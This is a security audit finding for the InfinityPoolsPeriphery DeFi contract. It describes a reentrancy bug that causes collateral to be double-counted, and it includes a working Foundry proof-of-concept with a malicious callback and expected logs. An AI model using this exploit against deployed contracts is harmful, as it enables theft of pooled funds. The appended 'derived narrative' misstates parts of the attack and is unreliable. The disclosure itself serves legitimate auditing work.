---
id: 4752
severity: "High"
---

# Multiple ways for reentrancy in InfinityPoolsPeriphery through both swapForwarders could lead to loss of funds Submitted by ktl, also found by yttriumzz, joicygiore, Nyxaris, ZC002 and Spearmint

## Description

In InfinityPoolsPeriphery.infinityPoolPaymentCallback() when there is a swap of type PaymentType.COLLATERAL_SWAP, a user can specify one of the two swapForwarders in src/periphery/swapForwarders to handle the swap with attacker controlled data.  
1. For src/periphery/swapForwarders/GeneralSwapForwarder.sol attacker controls both to and data.  
2. For src/periphery/swapForwarders/UniV2SwapForwarder.sol attacker controls path given to the uniswap router, an attacker can specify a path that goes through a malicious token he creates as uniswap pool creation is permissionless.  
Once the attacker has control flow, he pays for the swap and then calls any function that would increase the InfinityPoolsPeriphery's token balance (in the proof of concept the attacker calls InfinityPoolsPeriphery.depositERC20()), this will be double accounted in InfinityPoolsPeriphery.sol#L129 or the next line. This would be later added to the attacker's collateral in InfinityPoolsPeriphery.sol#L173 or InfinityPoolsPeriphery.sol#L180 (depending on token0 and token1).  
The below proof of concept is for the attack vector through GeneralSwapForwarder as the attack vector through UniV2SwapForwarder is too complex as it involves deploying a malicious token for reentrancy and creating a uniswap pool, but it should be very similar.

## Proof of Concept

1. Copy paste the following lines at the end of the setUp() function in test/cantina/InfinityPoolsBase.t.sol:  
```solidity
Token tmp_addr;
// swap token0 and token1 if not in the correct order
if (address(token0) > address(token1)) {
    tmp_addr = token0;
    token0 = token1;
    token1 = tmp_addr;
}
// factory is local var, we need it later
infinityPoolsFactory = factory;
```
2. Copy paste the proof of concept below into test/cantina/poc_h.t.sol.  
3. Run with forge test --match-path test/cantina/poc_h.t.sol -vv --match-test test_periphery_reentrancy.  
Note: test_normal_vault_deposit() in the poc is a util function to see how the Vault deposits/addCollateral works normally.  
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {InfinityPoolsBase} from "test/cantina/InfinityPoolsBase.t.sol";
import {console2} from "forge-std/console2.sol";
import {Quad, fromInt256, POSITIVE_ZERO, intoInt256} from "src/types/ABDKMathQuad/Quad.sol";
import "src/types/ABDKMathQuad/Constants.sol";
import {InfinityPool} from "src/InfinityPool.sol";
import "src/interfaces/IInfinityPool.sol";
import "src/libraries/external/Structs.sol";
import {InfinityPoolsPeriphery} from "src/periphery/InfinityPoolsPeriphery.sol";
import {IPermit2} from "src/periphery/interfaces/external/IPermit2.sol";
import {TUBS} from "src/Constants.sol";
import "src/libraries/helpers/PoolHelper.sol";
import "src/libraries/external/Spot.sol";
import "src/Constants.sol";
import "src/libraries/external/NewLoan.sol";
import "src/periphery/swapForwarders/GeneralSwapForwarder.sol";

contract POC is InfinityPoolsBase {
    bool first_callback = true;
    Quad liq = fromInt256(1);
    int256 startTub = 0;
    int256 stopTub = TUBS;
    InfinityPoolsPeriphery periphery;
    GeneralSwapForwarder swap_forwarder;

    function setUp() public override {
        super.setUp();
        periphery = new InfinityPoolsPeriphery();
        /*
        you will need to add the following lines at the end of InfinityPoolsBase.setUp()
        ```
        Token tmp_addr;
        if (address(token0) > address(token1)) {
            tmp_addr = token0;
            token0 = token1;
            token1 = tmp_addr;
        }
        infinityPoolsFactory = factory;
        ```
        */
        periphery.initialize(address(infinityPoolsFactory), address(0x0), IPermit2(address(0x0)));
        swap_forwarder = new GeneralSwapForwarder();
        periphery.addOrRemoveSwapForwarder(address(swap_forwarder), true);
        console2.log("[!] setUp() done, gasleft %d \n", gasleft());
    }

    function test_periphery_reentrancy() public {
        // taken from `test/unit/InfinityPool.t.sol`
        uint256 baseTimestamp = block.timestamp + 1 days;
        vm.warp(baseTimestamp);

        token0.approve(address(infinityPool), type(uint256).max);
        token1.approve(address(infinityPool), type(uint256).max);
        token0.approve(address(periphery), type(uint256).max);
        token1.approve(address(periphery), type(uint256).max);
        Quad liquidity = fromUint256(1000);
        (uint256 lpNum, int256 amount0, int256 amount1, ) = infinityPool.pour(0, TUBS, liquidity, "");
        Quad[] memory owedPotential = new Quad[](1);
        owedPotential[0] = Quad.wrap(bytes16(0x3fff0000000000000000000000000000));
        owedPotential[0] = fromInt256(1000);
        // int256 midBin = 15826;
        NewLoan.NewLoanParams memory new_loan_params = NewLoan.NewLoanParams({
            owedPotential: owedPotential,
            startBin: 16384 - 1,
            strikeBin: 16384 - 1,
            tokenMix: POSITIVE_ZERO,
            lockinEnd: POSITIVE_INFINITY,
            deadEra: OptInt256.wrap(OPT_INT256_NONE),
            token: false,
            twapUntil: OptInt256.wrap(OPT_INT256_NONE)
        });
        InfinityPoolsPeriphery.SwapInfo memory swap_params = InfinityPoolsPeriphery.SwapInfo({
            swapForwarder: address(swap_forwarder),
            tokenInSpender: address(this),
            to: address(this),
            data: abi.encodeWithSelector(bytes4(keccak256("malicious_callback()")), "")
        });
        periphery.newLoan(address(token0), address(token1), 15, address(this), swap_params, new_loan_params);

        console2.log(
            "[!] collateral token0 %e",
            periphery.collaterals(address(this), address(token0), address(token1), false)
        );
        console2.log(
            "[!] collateral token1 %e",
            periphery.collaterals(address(this), address(token0), address(token1), true)
        );
        console2.log(
            "[!] deposits token0 %e",
            periphery.deposits(address(this), address(token0))
        );
        console2.log(
            "[!] deposits token1 %e",
            periphery.deposits(address(this), address(token1))
        );
    }

    function test_normal_vault_deposit() public {
        console2.log("[debug] pre bal token0 %e", token0.balanceOf(address(this)));
        console2.log("[debug] pre bal token1 %e", token1.balanceOf(address(this)));
        uint256 amount = 1e18;
        token0.approve(address(periphery), type(uint256).max);
        token1.approve(address(periphery), type(uint256).max);
        periphery.depositERC20(IERC20(token0), address(this), amount, false, 0, 0, bytes(""));
        console2.log(
            "[debug] after depositERC20() collateral token0 %e",
            periphery.collaterals(address(this), address(token0), address(token1), false)
        );
        console2.log(
            "[debug] after depositERC20() collateral token1 %e",
            periphery.collaterals(address(this), address(token0), address(token1), true)
        );
        periphery.addCollateral(address(token0), address(token1), IERC20(token0), address(this), amount);
        console2.log("[debug] after addCollateral() post bal token0 %e", token0.balanceOf(address(this)));
        console2.log("[debug] after addCollateral() post bal token1 %e", token1.balanceOf(address(this)));
        console2.log(
            "[debug] collateral token0 %e",
            periphery.collaterals(address(this), address(token0), address(token1), false)
        );
        console2.log(
            "[debug] collateral token1 %e",
            periphery.collaterals(address(this), address(token0), address(token1), true)
        );
        periphery.withdrawAllCollaterals(address(token0), address(token1), address(this));
        periphery.withdrawERC20(IERC20(token0), address(this), address(this), 1e18);
        console2.log(
            "[debug] collateral token0 %e",
            periphery.collaterals(address(this), address(token0), address(token1), false)
        );
        console2.log(
            "[debug] collateral token1 %e",
            periphery.collaterals(address(this), address(token0), address(token1), true)
        );
        console2.log("[debug] post bal token0 %e", token0.balanceOf(address(this)));
        console2.log("[debug] post bal token1 %e", token1.balanceOf(address(this)));
    }

    function malicious_callback() public {
        console2.log("[debug][callback] entering malicious_callback()");
        uint256 allowance0 = token0.allowance(msg.sender, address(this));
        uint256 allowance1 = token1.allowance(msg.sender, address(this));
        console2.log("[debug][callback] token 0 allowance", allowance0);
        console2.log("[debug][callback] token 1 allowance", allowance1);
        if (allowance0 > 0) {
            token0.transferFrom(msg.sender, address(this), token0.allowance(msg.sender, address(this)));
            token1.transfer(msg.sender, allowance0 + (allowance0 / 500)); // rough estimation here for the 'tokenAmountOut'
        }
        if (allowance1 > 0) {
            token1.transferFrom(msg.sender, address(this), allowance1);
            token0.transfer(msg.sender, allowance1 + (allowance1 / 500)); // same here
            /* the following call is where the double accounting occurs, comment it and compare next log output to compare with normal newLoan flow */
            periphery.depositERC20(
                IERC20(token0),
                address(this),
                allowance1 + (allowance1 / 500),
                false,
                0,
                0,
                bytes("")
            );
        }
        console2.log("[debug][callback] exiting, token 0 allowance", token0.allowance(msg.sender, address(this)));
        console2.log("[debug][callback] exiting, token 1 allowance", token1.allowance(msg.sender, address(this)));
    }
}
```
Expected output:  
[PASS] test_periphery_reentrancy() (gas: 7348071)  
Logs:  
[!] setUp() done, gasleft 1058870034  
[debug][callback] entering malicious_callback()  
[debug][callback] token 0 allowance 0  
[debug][callback] token 1 allowance 621289518087014825  
[debug][callback] exiting, token 0 allowance 0  
[debug][callback] exiting, token 1 allowance 0  
[!] collateral token0 6.22532097123188854e17  
[!] collateral token1 0e0  
[!] deposits token0 6.22532097123188854e17  
[!] deposits token1 0e0  
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 20.78ms (7.70ms CPU time)

## Recommendation

The code is too complex to give a recommendation at this point.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a reentrancy flaw in the InfinityPoolsPeriphery contract that can be triggered during a collateral swap operation (payment type COLLATERAL_SWAP). The periphery contract delegates the actual token swap to a configurable swap forwarder contract. Becausethe forwarder address and the calldata passed to it are supplied by the caller, an attacker can deploy a malicious forwarder (GeneralSwapForwarder or UniV2SwapForwarder) and encode a callback that is executed after the swap payment is made. Inside this callback the attacker calls a function that increases the periphery's internal token balance – in the proof‑of‑concept the attacker invokes depositERC20 – before the original payment callback finishes its accounting. The periphery therefore records the same tokens twice: once in the normal accounting path (line 129 of InfinityPoolsPeriphery.sol) and again when depositERC20 updates the collateral mapping (lines 173 or 180). This double accounting inflates the attacker’s collateral balance, allowing the attacker to later withdraw more tokens than were actually supplied, effectively draining funds from the pool. The bug occurs only when a user initiates a collateral swap and the contract’s addOrRemoveSwapForwarder function has previously whitelisted a forwarder that the attacker controls; the reentrancy is triggered by the external call to the forwarder’s swap function, which can be crafted to invoke any arbitrary function on the periphery. The issue was discovered during a security audit when the researchers built a test that added a malicious forwarder, performed a newLoan call with a crafted SwapInfo, and observed that the collateral and deposit values reported by the periphery were larger than expected after the callback. The problem is hard to notice because the contract’s external view functions report the inflated balances as if they were legitimate, and the reentrancy happens deep inside a callback where typical static analysis may not flag a state‑changing external call. From a user’s perspective the symptoms are unexpected changes in collateral: after a swap the user may see their collateral amount increase dramatically, or later notice that the pool’s total token reserves have shrunk without any obvious withdrawal. The bug violates the core accounting assumption that each token transfer is accounted exactly once, breaking the protocol’s financial integrity. To remediate the issue the contract should follow the checks‑effects‑interactions pattern, moving all state updates that affect collateral before any external call, and should protect the functions that modify balances with a reentrancy guard. Additionally, the periphery should restrict which forwarder contracts can be used, validate the calldata supplied to them, or at least ensure that callbacks cannot re‑enter functions that modify the same accounting variables. In short, the flaw is a classic reentrancy where attacker‑controlled external code re‑enters a balance‑updating function, leading to double accounting and potential loss of funds for honest participants.
